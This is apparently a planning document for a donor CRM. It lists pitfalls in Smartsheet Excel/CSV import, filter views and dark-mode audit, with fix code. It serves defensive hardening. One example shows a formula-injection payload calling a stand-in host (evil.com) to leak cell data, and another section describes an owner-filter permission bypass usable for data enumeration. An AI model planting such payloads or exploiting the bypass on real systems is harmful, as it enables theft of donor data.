# Domain Pitfalls: Smartsheet Import, List Page Filters & Quality Audit

**Domain:** Adding Excel/CSV import with column mapping, comprehensive list page filters, and quality audit to existing Django/React CRM
**Researched:** 2026-02-16
**Confidence:** HIGH (pitfalls verified against actual DonorCRM codebase patterns)

## Critical Pitfalls

Mistakes that cause rewrites, security vulnerabilities, or data corruption.

### Pitfall 1: Smartsheet Excel Dates Arrive as Serial Numbers, Not Date Objects

**What goes wrong:**
Smartsheet exports dates as Excel serial numbers (e.g., `44927` instead of `2023-01-01`). When openpyxl reads these cells with `data_only=True`, some cells return `datetime` objects while others return raw integers depending on cell formatting. The existing `_parse_date()` function in `apps/imports/services.py:73-92` expects string input in formats like `YYYY-MM-DD` or `MM/DD/YYYY` -- it will silently fail on integer serial numbers, returning the error `"Invalid date format: 44927"`. Users see validation errors for every row containing dates.

**Why it happens:**
Excel stores dates internally as serial numbers (days since 1900-01-01, with the infamous Lotus 1-2-3 leap year bug for dates before March 1, 1900). Whether openpyxl returns a `datetime` or an `int` depends on whether the cell has a number format applied. Smartsheet exports are inconsistent about cell formatting -- date columns may or may not have format codes applied, especially when the Smartsheet column type was "Text/Number" containing date-like values rather than a native Date column.

**How to avoid:**
```python
# In new parse_smartsheet_file() -- NOT in existing _parse_date()
from datetime import datetime, timedelta
from openpyxl.utils.datetime import from_excel

def normalize_cell_value(cell_value, expected_type='text'):
    """Normalize openpyxl cell values to Python types."""
    if cell_value is None:
        return ''

    if expected_type == 'date':
        # Already a datetime from openpyxl
        if isinstance(cell_value, datetime):
            return cell_value.date()
        # Excel serial number (int or float)
        if isinstance(cell_value, (int, float)) and 1 < cell_value < 2958466:
            return from_excel(cell_value).date()
        # String date -- delegate to existing _parse_date()
        if isinstance(cell_value, str):
            parsed, error = _parse_date(cell_value)
            return parsed  # May be None if invalid
        return None

    if expected_type == 'amount':
        if isinstance(cell_value, (int, float)):
            return Decimal(str(cell_value))
        if isinstance(cell_value, str):
            amount, error = _parse_amount(cell_value)
            return amount
        return None

    # Default: convert to string
    return str(cell_value).strip()
```

**Warning signs:**
- Validation errors on date fields that look correct when opened in Excel
- Test files using hand-typed dates work, but actual Smartsheet exports fail
- Date columns returning integers in debug output
- All date rows failing validation simultaneously

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) -- type normalization layer must sit between openpyxl cell reading and existing validation functions

**Sources:**
- [openpyxl Dates and Times documentation](https://openpyxl.readthedocs.io/en/stable/datetime.html)
- [Date and Time Handling | openpyxl DeepWiki](https://deepwiki.com/soxhub/openpyxl/8.1-date-and-time-handling)

---

### Pitfall 2: Merged Cells in Smartsheet Exports Return None for All But Top-Left Cell

**What goes wrong:**
Smartsheet exports often contain merged header rows (e.g., a "Contact Information" header spanning columns A-E). When openpyxl reads merged cells, only the top-left cell has a value -- all other cells in the merged range return `None`. The header detection logic reads row 1 and gets `['Contact Information', None, None, None, None, 'Giving History', None, None]` instead of individual column names. Column mapping fails because headers are mostly `None`.

**Why it happens:**
Excel's merge operation stores the value only in the top-left cell. openpyxl faithfully represents this -- it does not "unmerge" or repeat values across the range. Developers test with simple Excel files where row 1 has clean individual headers. Real Smartsheet exports often have multi-level headers with merges.

**How to avoid:**
```python
from openpyxl import load_workbook

def extract_headers(workbook, sheet_name=None):
    """Extract headers, handling merged cells by skipping to first non-merged row."""
    ws = workbook.active if sheet_name is None else workbook[sheet_name]

    # Check for merged cells in first few rows
    merged_ranges = ws.merged_cells.ranges

    # Find first row where no cells are merged
    for row_idx in range(1, min(6, ws.max_row + 1)):  # Check first 5 rows
        row_values = [cell.value for cell in ws[row_idx]]

        # Skip rows that are entirely or mostly None (likely merged header rows)
        non_none_count = sum(1 for v in row_values if v is not None)
        if non_none_count >= len(row_values) * 0.5:  # At least 50% non-None
            return row_values, row_idx

    # Fallback: first row
    return [cell.value for cell in ws[1]], 1
```

**Warning signs:**
- Headers list contains mostly `None` values
- Column mapping auto-detection returns 0 matches
- Works with "clean" Excel files but fails with real Smartsheet exports
- Users reporting "file has no headers" when headers are clearly visible in Excel

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) -- header extraction must handle merged cells before column mapping UI is built

**Sources:**
- [openpyxl: dealing with merged cells](https://gist.github.com/tchen/01d1d61a985190ff6b71fc14c45f95c9)
- [How to work with merged cells in Excel with openpyxl](https://medium.com/@shizidushu/how-to-work-with-merged-cells-in-excel-with-openpy-in-python-89f32822a11f)

---

### Pitfall 3: Breaking Existing CSV Import by Modifying Shared Service Functions

**What goes wrong:**
New Smartsheet import feature shares validation logic with existing CSV import. Developer modifies `_parse_amount()` (services.py:47-70) to handle Excel numeric types (which arrive as `float` or `Decimal` from openpyxl, not strings). The modification changes the `amount_str.strip()` call to accept non-string types -- but now the existing CSV import path passes in string values that follow a different code path, and edge cases (like `"$1,234.56"` with dollar sign and comma) that previously worked now break because the shared function's contract changed.

**Why it happens:**
The existing services.py has 4 parsers (`parse_contacts_csv`, `parse_donations_csv`, `parse_funds_csv`, `parse_transactions_csv`, `parse_pledges_csv`) that all share `_parse_amount()`, `_parse_date()`, and `_validate_email()`. These helpers assume string input from `csv.DictReader`. Modifying them to also accept openpyxl types (int, float, datetime) introduces dual-type logic that can subtly break the string path.

**How to avoid:**
1. DO NOT modify `_parse_amount()`, `_parse_date()`, or `_validate_email()` in services.py
2. Create a NEW `smartsheet_services.py` file with a `normalize_cell_value()` layer that converts openpyxl types to strings BEFORE calling existing validators
3. Keep existing CSV import code paths completely unchanged
4. Run ALL existing import tests after any shared code changes

```python
# NEW FILE: apps/imports/smartsheet_services.py
from apps.imports.services import (
    _parse_amount, _parse_date, _validate_email,
    FORMULA_PREFIXES, parse_contacts_csv
)

def normalize_row_to_strings(row_values: list, headers: list) -> dict:
    """Convert openpyxl cell values to strings matching CSV format."""
    result = {}
    for header, value in zip(headers, row_values):
        if value is None:
            result[header] = ''
        elif isinstance(value, datetime):
            result[header] = value.strftime('%Y-%m-%d')
        elif isinstance(value, (int, float, Decimal)):
            result[header] = str(value)
        else:
            result[header] = str(value).strip()
    return result
```

**Warning signs:**
- Renaming or changing signatures of `_parse_amount`, `_parse_date`, or `_validate_email`
- Adding `isinstance()` checks to existing helper functions
- Existing CSV import tests still pass but manual testing fails with edge cases
- Test files used for CSV import are simple (no dollar signs, no commas in amounts)

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) -- establish file isolation before writing any Excel parsing code. Run full regression suite: `test_fund_import.py`, `test_entity_import.py`, `test_transaction_import.py`, `test_pledge_import.py`

---

### Pitfall 4: CSV/Formula Injection on Import -- Existing Defense Only Covers fund_id and name Fields

**What goes wrong:**
The existing import pipeline has formula injection prevention for `fund_id` and `name` fields in `parse_funds_csv()` (services.py:521-522) and `parse_entities_csv()` (services.py:682-695), but `parse_contacts_csv()` and `parse_donations_csv()` have NO formula prefix checking. A user imports a Smartsheet CSV where a contact's `first_name` is `=HYPERLINK("http://evil.com?d="&A1,"Click")`. This value passes validation, gets stored in the database, and later appears in exported CSV files where it executes when opened in Excel.

**Why it happens:**
Formula injection prevention was added per-parser during SPO import development, and only the parsers that handle external system IDs (funds, entities) got it. The contact and donation parsers were written earlier and never updated. The new Smartsheet parser must not repeat this gap.

**How to avoid:**
```python
# Add to ALL text field validation in new Smartsheet parser
def sanitize_text_field(value: str, field_name: str) -> tuple[str, str | None]:
    """Sanitize text field, rejecting formula injection attempts."""
    if not value:
        return value, None
    if value.startswith(FORMULA_PREFIXES):
        return None, f'{field_name} cannot start with formula character ({value[0]})'
    return value, None

# Apply to every user-provided text field during import
for field in ['first_name', 'last_name', 'email', 'phone', 'notes',
              'street_address', 'city', 'state']:
    value = row.get(field, '').strip()
    sanitized, error = sanitize_text_field(value, field)
    if error:
        row_errors.append(error)
```

**Warning signs:**
- New Smartsheet parser copies validation from `parse_contacts_csv()` (which lacks formula checks)
- No security test cases with formula payloads in test suite
- Only testing "happy path" import data

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) -- formula injection prevention must be part of ALL new parsing code. Also backfill `parse_contacts_csv()` and `parse_donations_csv()` as tech debt fix.

**Sources:**
- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection)

---

### Pitfall 5: Permission Bypass When Adding Filters to List Views (KNOWN BUG -- Must Fix BEFORE Filters)

**What goes wrong:**
The codebase has a known permission bypass documented in EDGE_CASE_AUDIT.md (section 2.2/4.1): `ContactDonationsView` and `ContactPledgesView` use `IsContactOwnerOrReadAccess` which only implements `has_object_permission()`. DRF's `ListAPIView` never calls `get_object()`, so the permission is never evaluated. Adding DjangoFilterBackend filters to these views (e.g., `?owner=<other_user_id>`) makes exploitation trivially easy -- before filters, an attacker needed to know a contact UUID; with filters, they can enumerate data with `?owner=1&owner=2&...`.

**Why it happens:**
The filter implementation task looks separate from the security fix. Developer adds `DjangoFilterBackend` with `filterset_fields = ['owner']` to `ContactListCreateView` without realizing that `get_queryset()` already handles owner-scoping manually (views.py:55-68) but the nested views (`ContactDonationsView`, `ContactPledgesView`) do not. Adding filters to the parent view is safe; extending the pattern to nested views is not.

**How to avoid:**
1. Fix the permission bypass BEFORE adding any filters -- this is a prerequisite, not a parallel task
2. Override `get_queryset()` in ALL list views to scope by owner:
```python
class ContactDonationsView(generics.ListAPIView):
    def get_queryset(self):
        contact_id = self.kwargs.get('pk')
        user = self.request.user

        # Scope by owner FIRST, then apply contact filter
        if user.role in ['admin', 'finance', 'read_only']:
            return Donation.objects.filter(contact_id=contact_id).order_by('-date')
        else:
            return Donation.objects.filter(
                contact_id=contact_id,
                contact__owner=user  # Owner scoping
            ).order_by('-date')
```
3. NEVER add `owner` or `uploaded_by` to filterset_fields for non-admin users
4. Add security test: regular user attempts `GET /api/v1/contacts/{other_user_contact}/donations/` and gets empty result or 404

**Warning signs:**
- Adding filters without first checking which views have the permission bypass
- `filterset_fields` includes `owner` without role-based exclusion
- No security-focused tests for cross-user data access

**Phase to address:**
Phase 1 (Security prerequisite) -- fix BEFORE Phase 3 (filtering backend). The EDGE_CASE_AUDIT.md ranks this #2 in the top 10 risk list.

**Sources:**
- [DRF Filtering documentation](https://www.django-rest-framework.org/api-guide/filtering/) -- "ensure that any unpermitted objects will not be included in the returned results"
- [DRF Permissions documentation](https://www.django-rest-framework.org/api-guide/permissions/) -- "Object level permissions are only checked with views that call get_object()"
- EDGE_CASE_AUDIT.md sections 2.2 and 4.1

---

### Pitfall 6: Filter Query Performance on Contacts with M2M Group Join

**What goes wrong:**
Adding a `group` filter to ContactList already exists manually (views.py:71-73: `queryset.filter(groups__id=group_id)`), but adding it as a DjangoFilterBackend filterset field creates duplicate filtering. More critically: the Contact model has `groups = ManyToManyField('groups.Group')` and filtering on M2M relationships without `distinct()` returns duplicate rows. User sees the same contact appearing 3 times because they belong to 3 groups.

The broader performance issue: adding `owner`, `created_at__gte`, `created_at__lte`, `last_gift_date__gte`, `last_gift_date__lte`, and `group` filters to a queryset that already has `select_related('owner')` produces a multi-join SQL query. On 5,000+ contacts, the query plan degrades from index scan to sequential scan if the combined filter cardinality is unfavorable.

**Why it happens:**
Django M2M filter silently creates a JOIN that can produce duplicates. The existing manual `filter(groups__id=group_id)` works because it is only one join, but combining it with DjangoFilterBackend's filter creates the same join twice. Developers don't notice duplicates with small test datasets.

**How to avoid:**
```python
class ContactListCreateView(generics.ListCreateAPIView):
    filterset_fields = {
        'status': ['exact'],
        'needs_thank_you': ['exact'],
        # Do NOT add 'groups' to filterset_fields -- use custom FilterSet
    }

    def get_queryset(self):
        user = self.request.user
        if user.role in ['admin', 'finance', 'read_only']:
            queryset = Contact.objects.all()
        else:
            queryset = Contact.objects.filter(owner=user)

        # Manual group filter with distinct()
        group_id = self.request.query_params.get('group')
        if group_id:
            queryset = queryset.filter(groups__id=group_id).distinct()

        # Owner filter (admin only)
        owner_id = self.request.query_params.get('owner')
        if owner_id and user.role == 'admin':
            queryset = queryset.filter(owner_id=owner_id)

        return queryset.select_related('owner')
```

Also: verify database indexes cover the combined filter pattern:
```python
class Meta:
    indexes = [
        models.Index(fields=['owner', 'status']),           # Existing
        models.Index(fields=['owner', 'last_gift_date']),    # Existing
        models.Index(fields=['status', 'needs_thank_you']),  # NEW for filter combo
    ]
```

**Warning signs:**
- Duplicate contacts appearing in filtered results
- Query counts increasing unexpectedly when combining multiple filters
- `EXPLAIN ANALYZE` showing sequential scan on contacts table
- Page load time doubling when 3+ filters are active simultaneously

**Phase to address:**
Phase 3 (Filtering backend) -- test every filter combination with 1000+ contacts, check for duplicates and query performance

**Sources:**
- [django-filter Performance Issues #1264](https://github.com/carltongibson/django-filter/issues/1264)
- [Django and the N+1 Queries Problem](https://www.scoutapm.com/blog/django-and-the-n1-queries-problem)
- [10 Tips to Optimize PostgreSQL Queries in Django](https://blog.gitguardian.com/10-tips-to-optimize-postgresql-queries-in-your-django-project/)

---

### Pitfall 7: Memory Exhaustion from Large Excel File Upload (Existing Pattern Amplified)

**What goes wrong:**
The existing CSV import reads entire files into memory: `content = file.read().decode('utf-8')` (views.py:78). This pattern is duplicated for Excel files, but Excel files are 3-10x larger than equivalent CSV files due to XML structure inside .xlsx. A 5MB CSV file might produce a 25MB .xlsx equivalent. openpyxl's default mode loads the entire workbook object model into memory, consuming 5-10x the file size in RAM. A 10MB Excel file can consume 100MB of Python process memory.

The app runs on Render free tier (512MB RAM). A single 10MB upload could exhaust available memory and crash the process.

**Why it happens:**
The existing import pattern (`file.read().decode('utf-8')`) works for CSV because CSV files are compact text. Developers extend this pattern to Excel without realizing openpyxl's memory characteristics. Additionally, there is no `FILE_UPLOAD_MAX_MEMORY_SIZE` or `DATA_UPLOAD_MAX_MEMORY_SIZE` configured in Django settings (documented in EDGE_CASE_AUDIT.md section 6.1).

**How to avoid:**
```python
# In new SmartsheetImportView
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB

def post(self, request):
    file = request.FILES.get('file')
    if not file:
        return Response({'detail': 'No file provided.'}, status=400)

    # Check file size BEFORE reading
    if file.size > MAX_FILE_SIZE:
        return Response(
            {'detail': f'File too large ({file.size // 1024 // 1024}MB). Maximum is 10MB.'},
            status=400
        )

    # For Excel: use read_only mode to stream rows
    if file.name.endswith(('.xlsx', '.xlsm')):
        wb = load_workbook(
            filename=file,           # Pass file object directly, not .read()
            read_only=True,          # Stream mode -- constant memory
            data_only=True           # Values not formulas
        )
        ws = wb.active
        headers = [cell.value for cell in next(ws.iter_rows(min_row=1, max_row=1))]
        # Preview: only read first 5 data rows
        preview_rows = []
        for i, row in enumerate(ws.iter_rows(min_row=2, max_row=6)):
            preview_rows.append([cell.value for cell in row])
        wb.close()  # CRITICAL: close workbook to release memory in read_only mode
    else:
        # CSV: existing pattern (acceptable for text files)
        content = file.read().decode('utf-8-sig')
```

Also add to Django settings:
```python
# settings/base.py
DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10MB
FILE_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024   # 10MB
```

**Warning signs:**
- No file size check before `file.read()`
- Using `load_workbook()` without `read_only=True`
- Not calling `wb.close()` after processing in read_only mode (leaks file handles)
- Testing only with small files (<100KB)

**Phase to address:**
Phase 1 (Excel/CSV parsing backend) -- file size limits and read_only mode are architectural decisions that must be made upfront

**Sources:**
- [Handling Large File Uploads in Django](https://medium.com/@ewho.ruth2014/handling-large-file-uploads-in-django-e86da6bde982)
- [openpyxl read_only mode](https://openpyxl.readthedocs.io/en/stable/usage.html)
- EDGE_CASE_AUDIT.md section 6.1

---

### Pitfall 8: Filter State Desynchronization Between URL and UI Components

**What goes wrong:**
The existing ContactList.tsx and DonationList.tsx use `useSearchParams()` for filter state (good pattern). But there is a subtle bug: `searchInput` is stored in `useState` (ContactList.tsx:65) separately from the URL param `search`. On initial page load from a bookmarked URL like `/contacts?search=smith`, the search INPUT shows "smith" (initialized from searchParams). But if the user clicks a status filter dropdown, `handleStatusFilter` creates a new `URLSearchParams(searchParams)` which preserves the search param. So far so good.

The pitfall appears when adding NEW filters (owner, date range, group) to existing pages: developers must replicate this synchronized pattern for EVERY new filter. If one filter uses `useState` without initializing from searchParams, bookmarks break for that filter. If one filter handler creates `new URLSearchParams()` (empty) instead of `new URLSearchParams(searchParams)` (preserving existing), it wipes other active filters.

**Why it happens:**
The existing pattern works but is fragile -- each filter handler independently creates `new URLSearchParams(searchParams)` and manually sets/deletes its own param. Adding 5 more filters means 5 more handler functions that must all follow the same pattern. One mistake in one handler breaks the whole filter experience.

**How to avoid:**
Extract a shared filter hook that manages all filter state through URL params:
```typescript
// hooks/useFilterParams.ts
export function useFilterParams<T extends Record<string, string | undefined>>(
  defaults: T
) {
  const [searchParams, setSearchParams] = useSearchParams()

  const filters = useMemo(() => {
    const result = { ...defaults }
    for (const key of Object.keys(defaults)) {
      result[key as keyof T] = (searchParams.get(key) || defaults[key]) as any
    }
    return result
  }, [searchParams, defaults])

  const setFilter = useCallback((key: keyof T, value: string | undefined) => {
    const params = new URLSearchParams(searchParams)  // Preserve ALL params
    if (value) {
      params.set(key as string, value)
    } else {
      params.delete(key as string)
    }
    params.set('page', '1')  // Reset pagination
    setSearchParams(params)
  }, [searchParams, setSearchParams])

  const clearFilters = useCallback(() => {
    setSearchParams({})
  }, [setSearchParams])

  return { filters, setFilter, clearFilters }
}

// Usage in ContactList.tsx
const { filters, setFilter, clearFilters } = useFilterParams({
  search: undefined,
  status: undefined,
  owner: undefined,
  group: undefined,
  needs_thank_you: undefined,
})
```

**Warning signs:**
- Each filter has its own `handleXxxFilter` function that creates `new URLSearchParams`
- Filter state uses `useState` without initializing from URL params
- Bookmarking a filtered URL does not restore all active filters
- Clicking one filter clears other active filters
- No "Clear All Filters" button

**Phase to address:**
Phase 4 (Filtering frontend UI) -- extract shared hook BEFORE adding new filters to avoid copy-paste errors

**Sources:**
- [Why URL state matters: useSearchParams in React](https://blog.logrocket.com/url-state-usesearchparams/)
- [Advanced React state management using URL parameters](https://blog.logrocket.com/advanced-react-state-management-using-url-parameters/)

---

### Pitfall 9: Dark Mode Audit Finds Hard-Coded Colors in Existing Components

**What goes wrong:**
Dark mode audit reveals that existing components (not just new ones) have hard-coded colors. The JournalHeader component uses `bg-card` and `text-muted-foreground` correctly (JournalHeader.tsx:56-57), but other pages use patterns like `className="font-medium"` without explicit color (inherits correctly) mixed with `className="text-sm text-gray-500"` (hard-coded gray, may not contrast well in dark mode). The audit scope creeps from "review new features" to "fix all existing pages," consuming the entire quality audit phase.

**Why it happens:**
The dark mode implementation uses Tailwind CSS variables (`bg-background`, `text-foreground`, `bg-card`, `text-muted-foreground`, etc.) defined in globals.css with both `:root` and `.dark` variants. Components that use shadcn/ui primitives get this for free. But custom code that uses raw Tailwind utilities (`text-gray-500`, `bg-white`, `border-gray-200`) bypasses the theme system. The temptation to fix EVERYTHING during the quality audit leads to massive diffs and potential regressions.

**How to avoid:**
1. Scope the dark mode audit to a checklist, not open-ended exploration
2. Categorize issues as "broken" (unusable in dark mode) vs "imperfect" (slightly wrong shade)
3. Fix only "broken" issues in v1.3; track "imperfect" as tech debt
4. Use automated grep to find hard-coded colors:

```bash
# Find potential dark mode issues in components
grep -rn "text-gray-\|bg-gray-\|text-white\|bg-white\|border-gray-\|text-black\|bg-black" \
  frontend/src/pages/ frontend/src/components/ \
  --include="*.tsx" --include="*.ts" \
  | grep -v node_modules | grep -v ".test."
```

5. For each finding, check if the semantic equivalent exists:

| Hard-coded | Semantic Equivalent |
|-----------|-------------------|
| `text-gray-500` | `text-muted-foreground` |
| `bg-white` | `bg-background` or `bg-card` |
| `border-gray-200` | `border-border` |
| `text-gray-900` | `text-foreground` |
| `bg-gray-50` | `bg-muted` |
| `bg-gray-100` | `bg-secondary` |

**Warning signs:**
- Audit scope expanding from "v1.3 features" to "all pages"
- No predefined checklist or pass/fail criteria
- Dark mode "fixes" introducing visual regressions in light mode
- Large PRs that mix feature work with dark mode fixes

**Phase to address:**
Phase 5 (Quality audit) -- define scope and pass/fail criteria BEFORE starting the audit. Limit to pages touched in v1.3 + any page where text is invisible in dark mode.

**Sources:**
- [Dark Mode - Tailwind CSS](https://tailwindcss.com/docs/dark-mode)
- [Simple dark mode support with Tailwind and CSS variables](https://invertase.io/blog/tailwind-dark-mode)
- globals.css in this project (`:root` and `.dark` CSS variable definitions)

---

### Pitfall 10: Smartsheet Exports Include Hidden Columns and Checkbox Booleans as "True"/"False" Strings

**What goes wrong:**
User exports a Smartsheet that has hidden columns. They expect hidden columns to be excluded, but Smartsheet includes them in the export unless the user explicitly unhides and filters. The column mapping UI shows 30 columns when the user expected 10, confusing them. Additionally, Smartsheet checkbox columns export as literal strings `"True"` and `"False"` (not Python booleans), and dropdown/contact-list columns export as plain text. Date columns may export as text strings if the Smartsheet column type was "Text/Number."

**Why it happens:**
Per [Smartsheet's export documentation](https://help.smartsheet.com/articles/770623-exporting-sheets-reports-from-smartsheet): "Excel doesn't support dropdown, contact list, checkbox, and symbols columns; only text values are exported." Hidden data IS included unless unhidden before export. This is a Smartsheet platform behavior, not a bug in parsing code.

**How to avoid:**
1. Show ALL columns in the mapping UI (don't hide columns with unusual names)
2. Add a "Skip this column" option in the mapper (not every column needs to map)
3. Handle `"True"`/`"False"` strings as boolean values for checkbox-sourced columns
4. Show column preview with first 3 row values so user can identify column content
5. Document Smartsheet export instructions in the import dialog:

```typescript
// In SmartsheetImportDialog step 1
<Alert>
  <AlertTitle>Preparing your Smartsheet export</AlertTitle>
  <AlertDescription>
    <ul className="list-disc pl-4 space-y-1 text-sm">
      <li>Go to File > Export > Export to Excel</li>
      <li>Hidden columns will be included -- unhide only the ones you need</li>
      <li>Checkbox columns will appear as "True" or "False" text</li>
      <li>Date columns should use Smartsheet's Date column type for best results</li>
    </ul>
  </AlertDescription>
</Alert>
```

**Warning signs:**
- Users complaining "too many columns" in mapping UI
- Boolean fields importing as text strings "True" instead of Python `True`
- Date parsing failures on columns that looked fine in Smartsheet

**Phase to address:**
Phase 2 (Column mapping UI) -- UX design must account for messy real-world exports, not clean test files

**Sources:**
- [Smartsheet Export Documentation](https://help.smartsheet.com/articles/770623-exporting-sheets-reports-from-smartsheet)
- [Smartsheet Excel Export without hidden columns](https://community.smartsheet.com/discussion/144142/excel-export-without-hidden-columns)

---

### Pitfall 11: Float Arithmetic in monthly_equivalent Creates Penny Errors in Filter Results

**What goes wrong:**
The existing `Pledge.monthly_equivalent` property (pledges/models.py:138-146) uses float arithmetic: `float(self.amount) * multipliers.get(self.frequency, 1)` where multipliers are `1/3`, `1/6`, `1/12`. This is known tech debt from EDGE_CASE_AUDIT.md section 3.1. When adding filters that display pledge totals or filter by pledge amount ranges, the float errors compound: filtering contacts by "monthly support > $100" might exclude a contact with 3 quarterly $100 pledges because `100 * 1/3 * 3 = 99.99999999999999` instead of `100.00`.

**Why it happens:**
The property returns `float`, and `Contact.monthly_pledge_amount` (contacts/models.py:144-149) sums these floats in a Python loop. The error was minor when displaying a single value but becomes a filter correctness issue when used in queryset annotations or range comparisons.

**How to avoid:**
Fix the root cause in the quality audit phase:
```python
# pledges/models.py -- FIXED
@property
def monthly_equivalent(self):
    """Calculate monthly equivalent for support tracking."""
    multipliers = {
        PledgeFrequency.MONTHLY: Decimal('1'),
        PledgeFrequency.QUARTERLY: Decimal('1') / Decimal('3'),
        PledgeFrequency.SEMI_ANNUAL: Decimal('1') / Decimal('6'),
        PledgeFrequency.ANNUAL: Decimal('1') / Decimal('12'),
    }
    result = self.amount * multipliers.get(self.frequency, Decimal('1'))
    return result.quantize(Decimal('0.01'))  # Round to cents
```

For filter backend, compute monthly equivalent in SQL to avoid Python float issues:
```python
from django.db.models import Case, When, F, DecimalField, Value

Contact.objects.annotate(
    monthly_support=Sum(
        Case(
            When(pledges__frequency='monthly', then=F('pledges__amount')),
            When(pledges__frequency='quarterly', then=F('pledges__amount') / Value(3)),
            When(pledges__frequency='semi_annual', then=F('pledges__amount') / Value(6)),
            When(pledges__frequency='annual', then=F('pledges__amount') / Value(12)),
            output_field=DecimalField(max_digits=10, decimal_places=2),
        ),
        filter=Q(pledges__status='active')
    )
).filter(monthly_support__gte=Decimal('100'))
```

**Warning signs:**
- Filter results excluding contacts that should match
- Dashboard totals not matching sum of individual pledge amounts
- Test assertions using `assertAlmostEqual` instead of exact comparison

**Phase to address:**
Phase 5 (Quality audit) -- fix Decimal arithmetic BEFORE Phase 3 (filtering backend) if filters will use pledge amounts

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Loading entire Excel file with `file.read()` instead of `read_only=True` | Simpler parsing code | OOM on 10MB+ files; crash on 512MB Render tier | Never for Excel; use `read_only=True` always |
| Storing column mapping only in React `useState` | No backend model needed | Lost on refresh; user re-does 5min of mapping work | Acceptable if wizard has < 5 steps and < 30 seconds of work |
| Hard-coding Smartsheet column patterns (e.g., "First Name" variations) | Quick auto-detection | New column naming patterns require code changes | MVP only; add user-configurable patterns in v1.4 |
| Skipping `distinct()` on M2M group filter | One less method call | Duplicate contacts in filtered results | Never; always use `distinct()` with M2M filters |
| Using `useState` per filter instead of shared URL hook | Familiar pattern | Broken bookmarks, filter state desync, copy-paste errors | Prototyping only; extract hook before launch |
| Disabling dark mode for new import wizard "temporarily" | Ship feature faster | Users in dark mode can't use import feature; brand inconsistency | Never; test in both modes during development |
| Not profiling queries after adding filters | Faster development | N+1 or sequential scan discovered in production at 5k contacts | Never; profile with Django Debug Toolbar before merge |
| Reusing `parse_contacts_csv` directly for Excel data | Less code | Breaks when Excel sends datetime/float types instead of strings | Never; add normalization layer between openpyxl and existing parsers |

## Integration Gotchas

Common mistakes when connecting Excel parsing to existing import pipeline.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| openpyxl + dates | Assuming all dates are strings | Handle `datetime`, `int` (serial), and `str` types with `normalize_cell_value()` |
| openpyxl + merged cells | Reading row 1 for headers | Scan first 5 rows, skip rows where >50% cells are None |
| openpyxl + memory | Using default mode for file parsing | Always use `read_only=True` and `data_only=True`; call `wb.close()` after |
| openpyxl + encoding | Assuming UTF-8 throughout | Excel files are binary (ZIP containing XML); use `file` object not `file.read().decode()` |
| DjangoFilterBackend + M2M | Adding `groups` to `filterset_fields` | Use manual filter with `distinct()` in `get_queryset()` |
| DjangoFilterBackend + permissions | Trusting filter_backends to enforce access | Override `get_queryset()` to scope by owner BEFORE filters apply |
| React `useSearchParams` | Creating separate `useState` for each filter | Use URL params as single source of truth via shared hook |
| Tailwind dark mode | Using `text-gray-500`, `bg-white` | Use semantic `text-muted-foreground`, `bg-background` |
| Smartsheet checkbox columns | Expecting boolean values | Handle `"True"`/`"False"` strings from Smartsheet exports |

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Loading all Excel rows into Python list | Fast with 100 rows | Use openpyxl `read_only=True` with `iter_rows()` | >10k rows or >10MB file |
| N+1 queries in filtered list views | Fine with 10 contacts | `select_related()` / `prefetch_related()` in `get_queryset()` | >100 items with related serializer fields |
| M2M group filter without `distinct()` | Invisible with 0-1 groups per contact | Always call `distinct()` after M2M filter | Contact belongs to 2+ groups |
| No pagination on import history | Works with 10 imports | Paginate ImportRun list, limit to 50 per page | >200 import runs |
| Synchronous Excel file processing | Responsive for small files | Add Celery task for files >5MB or >1000 rows | >5MB files or >1000 rows |
| Unbounded error list in import results | Manageable with 10 errors | Limit to first 20 errors + total count (existing pattern) | >100 row errors |
| All filter dropdown options loaded eagerly | Works with 10 missionaries | Lazy-load owner dropdown with search/autocomplete | >50 missionaries |
| Combined multi-filter query without composite index | Fast with <1000 contacts | Add composite indexes for common filter combos | >5000 contacts with 3+ active filters |

## Security Mistakes

Domain-specific security issues beyond general web security.

| Mistake | Risk | Prevention |
|---------|------|------------|
| No formula injection check on `parse_contacts_csv()` text fields | Data exfiltration when exported CSV opened in Excel | Add `FORMULA_PREFIXES` check to ALL text fields in ALL parsers |
| Adding `owner` to filterset_fields for non-admin users | Cross-user data enumeration via `?owner=X` parameter | Scope `get_queryset()` by user; exclude `owner` from non-admin FilterSet |
| `IsContactOwnerOrReadAccess` only checks `has_object_permission()` | Any user can view any contact's donations/pledges via ListAPIView | Fix permission class or override `get_queryset()` with owner filter |
| No file type validation beyond extension check | Malicious file upload (crafted .xlsx containing XML bombs) | Validate magic bytes (PK for .xlsx ZIP); set file size limits |
| No rate limiting on import endpoint | Resource exhaustion from repeated large imports | Add DRF throttling: 10 imports per hour per user |
| Excel macros executing during openpyxl parsing | Macro execution not actually a risk (openpyxl doesn't execute macros) | Non-issue but document for user confidence: "Macros are ignored during import" |

## UX Pitfalls

Common user experience mistakes in this domain.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Column mapping with only drag-drop | Keyboard and mobile users blocked | Provide dropdown select fallback alongside any drag-drop |
| No preview of mapped data before import | User imports wrong mapping, must undo | Show 3-5 preview rows with mapped column values before confirm |
| Cryptic error: "Invalid date format: 44927" | User cannot diagnose Excel serial number issue | Show "Row 5: Date column contains number '44927'. Expected date format like '2024-01-15'" |
| No visual indicator of active filters | User forgets filters are active, sees incomplete data | Show active filter badges/pills with X to remove; "Clear All" button |
| Losing column mapping state on browser refresh | User rage-quits after redoing 5 minutes of mapping work | Persist mapping to sessionStorage; add beforeunload warning |
| All-or-nothing import on Smartsheet data | One bad row blocks entire import; user must fix whole file | Skip invalid rows, import valid ones, provide error CSV download (existing pattern) |
| Filter applies on every keystroke in search | Requests fire for every character typed; flickering results | Debounce search input (300ms); other filters apply on selection |
